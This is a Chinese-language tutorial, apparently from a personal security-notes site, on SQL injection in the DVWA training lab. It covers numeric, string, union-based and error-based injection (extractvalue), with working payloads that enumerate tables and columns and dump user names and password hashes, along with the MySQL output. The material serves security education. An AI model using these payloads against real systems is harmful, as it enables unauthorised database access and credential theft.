---
slug: /net-security/06/01
---

**SQL 注入漏洞**：没有对输入做一个校验和过滤，使得输入变为 SQL 语句并执行。

SQL 注入条件：

1. 参数对用户来说可控
2. 参数最终会作为数据库查询语句之一



## 类型

### 数字型

输入的参数为整型时，若存在注入漏洞，称为**数字型注入**漏洞。测试步骤：

1️⃣ 加单引号，对应 URL：`www.test.com/test.php?id=1’`

对应的 SQL 语句：`select * from table where id=1’;` 查询出错，则可能存在漏洞。

2️⃣ 加 `and 1 = 1`，对应 URL：`www.test.com/test.php?id=1 and 1 = 1;`

对应的 SQL 语句：`select * from table where id = 1 and 1 = 1;`。 查询正常，则增加存在漏洞可能性。

3️⃣ 加 `and 1 = 2`，对应 URL：`www.test.com/test.php?id = 1 and 1 = 2;`

对应的 SQL 语句：`select * from table where id = 1 and 1 = 2;` 查询失败，则确定漏洞存在。 



### 字符型

输入参数为字符串时，若存在注入漏洞，成为**字符型注入**漏洞。测试步骤：

尝试输入 `1' or 1 = 1#`

对应的 SQL 语句：`select * from table where id='1' or 1 = 1 #'`，如果查询得到所有数据，则确定漏洞存在。

---

在 DVWA 靶场环境中，可以在 SQL Injection 练习：

![](http://img.wukaipeng.com/2023/0922-080220-image-20230922080219805.png)



### Union 注入

`union` 可以联合查询多个表：

```sql
mysql> select first_name, last_name from users where user_id = 1 union all select first_name, last_name from users where user_id = 2;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
+------------+-----------+
2 rows in set (0.00 sec)
```

`union` 查询的表的列数要一致。

注入的时候可以用  `order by 2` 去知道后端查询语句有多少列：`1' order by  2#`

`order by <number>` 这里是根据查询结果中的某列进行排序，如果 `number` 大于查询出来的列出，那么会报错：

```sql
# 根据结果第一列进行排序 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 1 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Bob        | Smith     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第二列进行排序，正常 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 2 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第三列进行排序，报错 ❌
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 3 #'
    -> ;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

构造 `union` 语句获取数据库名称和版本：`1' union select database(), version() ;#`

![](http://img.wukaipeng.com/2023/0922-085205-image-20230922085204940.png)

🌟 数据库  `information_schema` 

三个重要的表：

1. `SCHEMATA`： 包含所有数据库的名字
2. `TABLES`：包含所有数据库的所有表，默认字段为 `table_name`
3. `COLUMNS`：包含所有数据的所有表的所有字段

三个重要的列

1. `TABLE_SCHEMA：数据库名`
2. `TABLE_NAME`：表名
3. `COLUMN_NAME`：字段名

---

联合注入的过程：

1️⃣ 判断列数、显示位

2️⃣ 获取目标数据库名

3️⃣ 获取目标数据库的所有表名、字段名、字段中的数据

---

获取目标数据库名

```sql
# 注入 SQL：
1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'; #
```
```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa';
+------------+---------------------------+
| first_name | last_name                 |
+------------+---------------------------+
| admin      | admin                     |
| 1          | guestbook,k_account,users |
+------------+---------------------------+
2 rows in set (0.02 sec)
```

> `GROUP_CONCAT()`   函数将组中的字符串连接成为单个字符串。

获取字段名

```sql
# 注入 SQL
1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'; #
```
```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users';
+------------+---------------------------------------------------------------------------+
| first_name | last_name                                                                 |
+------------+---------------------------------------------------------------------------+
| admin      | admin                                                                     |
| 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
+------------+---------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

获取值

```sql
# 注入 SQL
1' union select user, password from users; #
```

```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select user, password from users;
+------------+----------------------------------+
| first_name | last_name                        |
+------------+----------------------------------+
| admin      | admin                            |
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb    | e99a18c428cb38d5f260853678922e03 |
| 1337       | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy     | 5f4dcc3b5aa765d61d8327deb882cf99 |
+------------+----------------------------------+
6 rows in set (0.00 sec)
```



### 报错注入

利用数据库报错判断是有存在注入点

常用的特殊字符：`\`, `;`, `%00`, `)`, `(`, `#`, `'`, `"` 

这两个函数常用于报错注入：

- `extractvalue()`：用于从 XML 中获取指定的值
- `updatexml()`

---

函数 `extractvalue(xml_frag, xpath_expr)`：

1. `xml_frag`: 这是要处理的 XML 数据的字符串。
2. `xpath_expr`: 这是一个 XPath 表达式，用于指定你想从 XML 数据中提取的值的位置。

下面是一个使用 `EXTRACTVALUE()` 函数的简单示例：

```sql
SELECT EXTRACTVALUE('<book><title>Learn MySQL</title></book>', '/book/title');
```

在上面的例子中，`EXTRACTVALUE()` 函数从给定的 XML 字符串中提取书的标题，并返回值 "Learn MySQL"。

---

利用函数 `extractvalue(xml_frag, xpath_expr)` 报错获取信息，由于 `xml_frag` 接受任意值，所以主要利用 `xpath_expr` 解析特点来爆破：

1️⃣ 获取数据库名

```sql
mysql>  select first_name, last_name from users where user_Id = 1 and extractvalue(1, concat(0x7e, database(), version()));
ERROR 1105 (HY000): XPATH syntax error: '~dvwa5.5.54-0+deb8u1-log'
```

2️⃣ 获取表名

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='dvwa')));
ERROR 1105 (HY000): XPATH syntax error: '~guestbook,k_account,users'
```

3️⃣ 获取列名

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user_id,first_name,last_name,us'

# 🚫 这里的错误返回被截断了，我们改用 limit 条件来单独获取每一个列名

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~user_id'

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 1,1)));
ERROR 1105 (HY000): XPATH syntax error: '~first_name'

……

# 🚫 另外一种方式是使用 substring 去继续获取剩余的字符串
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select substring(group_concat(column_name), 30) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user,password,avatar,last_login'
```

4️⃣ 获取账号密码

```sql
# 获取账号
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select user_id from dvwa.users limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~1'

# 获取密码
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select password from dvwa.users where user_id = 1 limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```









